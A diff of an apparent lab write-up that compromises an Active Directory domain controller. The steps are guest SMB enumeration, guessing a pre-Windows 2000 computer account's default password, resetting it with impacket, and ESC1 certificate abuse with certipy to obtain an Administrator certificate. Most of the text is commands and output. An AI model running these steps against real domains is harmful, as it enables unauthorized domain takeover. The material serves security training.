@@ -89,6 +89,7 @@ Nmap done: 1 IP address (1 host up) scanned in 93.81 seconds
 
 You can try ffufing but it shows nothing of interest. The bulk of enum'll be done almost totaly via smb.
 Check guest shares via nxc:
+
 ````
  nxc smb 10.129.234.44 -u guest -p '' --shares
 SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -104,7 +105,8 @@ SMB         10.129.234.44   445    DC               Notes
 SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
 SMB         10.129.234.44   445    DC               Trainees        READ            
 ````
-there are two non default shares: Notes and Trainees. Trainees can be read by guest. Get it with smbclient:
+
+There are two non default shares: Notes and Trainees. Trainees can be read by guest. Get it with smbclient:
 ````
 smbclient //10.129.234.44/Trainees -U guest ''
 Try "help" to get a list of possible commands.
@@ -244,5 +246,170 @@ Best
 James                  
 ````
 
-The key here is "older than me". It's clear that they are talking about the BANKING$ acc, and "older than me" makes me think of pre-windows 2000 computers. There is a great article about that here: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts.
-The way to go here is to change de BANKING$ acc password
+The key here is "older than me". It's clear that they are talking about the BANKING$ acc, and "older than me" makes me think of pre-windows 2000 computers. There is a great article about that here: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts and here https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers
+So, computer accs like BANKING$ in pre windows 2000 systems would have the password default based on the name of the account, but in lowercase. Let's see if that's the case:
+
+<img width="1792" height="65" alt="image" src="https://github.com/user-attachments/assets/b95a53fa-c9a1-43c8-bde0-1d224db2bd1e" />
+
+Here we have a confirmation that the password for BANKING$ is indeed banking:
+
+````
+retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+````
+
+The changepasswd script from impacket can change de password of the BANKING$ account:
+````
+<img width="1232" height="105" alt="image" src="https://github.com/user-attachments/assets/726e6c83-fb1b-4c78-93e4-e0687f1118f1" />
+````
+
+Now the password for BANKING$ should be 'password'. Let's check it:
+
+<img width="1372" height="67" alt="image" src="https://github.com/user-attachments/assets/d5b9e69f-7f3e-4fb2-851b-a75b9e92e1f4" />
+
+Very nice, let's ask ldap for adcs:
+````
+└─$ nxc ldap dc.retro.vl -u "banking$" -p 'password' -M adcs
+LDAP        10.129.82.134   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
+LDAP        10.129.82.134   389    DC               [+] retro.vl\banking$:password 
+ADCS        10.129.82.134   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS        10.129.82.134   389    DC               Found PKI Enrollment Server: DC.retro.vl
+ADCS        10.129.82.134   389    DC               Found CN: retro-DC-CA
+````
+
+ADCS is installed and a Certificate Authority is present as retro-DC-CA. Let's use certipy to enum further:
+````
+└─$ certipy-ad find -u 'BANKING$' -p 'password' -dc-ip 10.129.82.134 -vulnerable -stdout
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'retro-DC-CA'
+[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : retro-DC-CA
+    DNS Name                            : DC.retro.vl
+    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
+    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
+    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
+    Certificate Validity End            : 2028-07-23 21:13:50+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : RETRO.VL\Administrators
+      Access Rights
+        ManageCa                        : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        ManageCertificates              : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Enroll                          : RETRO.VL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : RetroClients
+    Display Name                        : Retro Clients
+    Certificate Authorities             : retro-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2023-07-23T21:17:47+00:00
+    Template Last Modified              : 2023-07-23T21:18:39+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : RETRO.VL\Administrator
+        Full Control Principals         : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Owner Principals          : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Dacl Principals           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Property Enroll           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+````
+We found a vulnerability here
+
+````
+ [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+````
+According to this article: https://www.semperis.com/blog/esc1-attack-explained/
+"In an ESC1 attack, an attacker exploits a misconfigured Enterprise CA certificate template in AD CS to request a certificate for a high-privileged account—for example, Domain Admin. Then, they use that certificate to act as that account, gaining unauthorized control."
+
+We can use certipy to exploit it, might take one or two tries:
+````
+└─$ certipy-ad req -u 'BANKING$' -p 'password' -dc-ip 10.129.82.134 -ca retro-DC-CA -template RetroClients -upn Administrator -debug -target dc.retro.vl -key-size 4096 -sid S-1-5-21-2983547755-698260136-4283918172-500
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '10.129.82.134'
+[+] DC IP: '10.129.82.134'
+[+] DC Host: None
+[+] Target IP: None
+[+] Remote Name: 'dc.retro.vl'
+[+] Domain: ''
+[+] Username: 'BANKING$'
+[+] Trying to resolve 'dc.retro.vl' at '10.129.82.134'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.129.82.134[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.129.82.134[\pipe\cert]
+[*] Request ID is 9
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator'
+[+] Found SID in SAN URL: 'S-1-5-21-2983547755-698260136-4283918172-500'
+[+] Found SID in security extension: 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[+] Attempting to write data to 'administrator.pfx'
+File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[+] Data written to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+````
+
+Now we use the certificate and private key saved at administrator.pfx to retrieve the RC4 hash of the Administrator user:
+````
+
+
+
+
+
+
